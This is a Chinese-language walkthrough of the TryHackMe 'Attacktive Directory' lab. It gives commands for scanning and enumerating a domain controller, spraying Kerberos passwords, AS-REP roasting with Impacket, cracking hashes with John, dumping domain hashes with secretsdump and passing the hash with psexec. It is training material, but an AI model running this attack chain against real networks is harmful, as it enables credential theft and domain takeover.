## 攻击活动目录

靶机：https://tryhackme.com/room/attacktivedirectory

> 本文围绕靶机来进行讨论。 --- sec875

## nmap

`nmap -p- -T4 -v 10.10.216.166`  
注意：如果想查看流量的情况，可以参考本人写的流量篇，也许可以帮助到您https://www.anquanke.com/post/id/243935

## 安装Impcket

    
    
    git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket 
    
    sudo apt install python3-pip 
    
    pip3 install -r /opt/impacket/requirements.txt 
    
    cd /opt/impacket/ && python3 ./setup.py install
    

如果有问题运行下面命令

    
    
    sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket 
    
    sudo pip3 install -r /opt/impacket/requirements.txt 
    
    cd /opt/impacket/ 
    
    sudo pip3 install . 
    
    sudo python3 setup.py install
    

## 安装bloodhound 和 neo4j

`apt install bloodhound neo4j`

## smb连接与枚举

`enum4linux -a 10.10.216.166`  
`smbclient -L \\\\10.10.216.166\\`  
![image](https://image.3001.net/images/20210712/1626083153_60ec0f516e433ec680c58.png!small)

## 枚举139，445

`nmap -p 139,445 -A -T4 -v 10.10.216.166`  
实际环境谨慎账户枚举，别把用户账号锁定

## 枚举Kerberos用户

工具安装，请查如下URL：  
https://pypi.org/project/kerbrute/

`python3 kerbrute.py`

使用字典在该github仓库获取  
https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt

https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt

编辑一下 /etc/hosts 方便参数填写  
![image](https://image.3001.net/images/20210712/1626083326_60ec0ffeb043dc5bc8bd5.png!small)

`python3 kerbrute.py -dc-ip 10.10.216.166 -users /home/sec875/userlist.txt
-domain spookysec.local`  
可以看见枚举出来的用户  
![image](https://image.3001.net/images/20210712/1626083442_60ec1072a6af21a3a8868.png!small)

然后就是用工具枚举账户密码  
`python3 kerbrute.py -dc-ip 10.10.216.166 -users /home/sec875/userlist.txt
-passwords /home/sec875/passwordlist.txt -domain spookysec.local`

## kerberos服务票据预认证

快速理解的图  
![image](https://image.3001.net/images/20210712/1626083573_60ec10f5b6d925539ebbb.png!small)

## 攻击 Kerberos服务票据的预认证缺陷的点

![image](https://image.3001.net/images/20210712/1626083636_60ec1134e5b17006ee0a2.png!small)

> 参考资料：https://book.hacktricks.xyz/windows/active-directory-> methodology/asreproast

简而言之。任何人都可以使用svc-admin【任意用户】用户向DC发送AS_REQ请求，接收AS_REP响应。响应包中携带该用户密码的哈希。最后本地破解或者哈希传递

优势在于执行预认证攻击不需要域账户（在前面，我们使用了检索域中没有 Kerberos 预身份验证用户的工具。 否则必须猜测用户名。 ）

如果您对简图有点意见，并认为我错过了很多东西，建议参考kerberos的RFC文档（如果感觉很困难，可以联系本人，帮忙翻译）：https://www.rfc-editor.org/rfc/rfc1510.html

可以从消息交换这里读起：  
![image](https://image.3001.net/images/20210712/1626085309_60ec17bd75705cf65e630.png!small)

## 发送请求拉取哈希

`python3 GetNPUsers.py spookysec.local/svc-admin -no-pass`  
此工具位于前面安装的Impcket包中  
![image](https://image.3001.net/images/20210712/1626085623_60ec18f7aec2a13863222.png!small)  
编程不是必须的，此代码有400多行，但我鼓励您针对性的阅读它，从里面的语法糖结构开始搜python官方文档。为了控制篇幅，代码解读则不在本文讨论范围之内。

拉取结果如下图所示  
![image](https://image.3001.net/images/20210712/1626085868_60ec19ec3dcbe1a20db06.png!small)

存到hash.txt文件里  
![image](https://image.3001.net/images/20210712/1626085900_60ec1a0c18de574c26226.png!small)

## 本地破解哈希

`john hash.txt --wordlist=passwordlist.txt`  
![image](https://image.3001.net/images/20210712/1626087113_60ec1ec9d886d9284c932.png!small)

看看共享文件夹  
![image](https://image.3001.net/images/20210712/1626087164_60ec1efcda5c2382a5c41.png!small)

关于IPC$ (默认共享，空会话等术语）请查阅微软文档，不要和共享文件夹混淆了，它们是不同的对象：  
https://docs.microsoft.com/zh-cn/troubleshoot/windows-server/networking/inter-process-communication-share-null-session  
![image](https://image.3001.net/images/20210712/1626087351_60ec1fb71e1aefd2b71be.png!small)

进入感兴趣的文件夹中，get拉取信息到家目录  
`smbclient \\\\10.10.216.166\\backup -U svc-admin`  
![image](https://image.3001.net/images/20210712/1626087485_60ec203d94983ed704d5b.png!small)

查看内容，base64解码  
![image](https://image.3001.net/images/20210712/1626087738_60ec213af3f4dbfeb9070.png!small)

哈希转存  
secretsdump.py 脚本在何处？嘿。相信到这里已经难不住大家了。

![image](https://image.3001.net/images/20210712/1626087900_60ec21dc0664d51dac5c4.png!small)

注意-just-dc参数转存了什么东西。  
![image](https://image.3001.net/images/20210712/1626088203_60ec230b2fd535a5a5a29.png!small)

## 哈希传递

`python3 psexec.py --help`  
找到哈希传递的参数  
![image](https://image.3001.net/images/20210712/1626088410_60ec23daa3338f61488e8.png!small)

注意，它做了一系列的权限维持

![image](https://image.3001.net/images/20210712/1626088436_60ec23f44190cdd191b56.png!small)

## 其他域控资料

https://blog.spookysec.net/kerberos-abuse/

## 结尾

如果您喜欢web安全，还可以查阅本人编辑的web安全101

要不要考虑请叔喝上一杯？  
https://www.yuque.com/sec875/blzpv4/ofepol

祝各位师傅都有所获。

我们还会再见面的。

共勉。

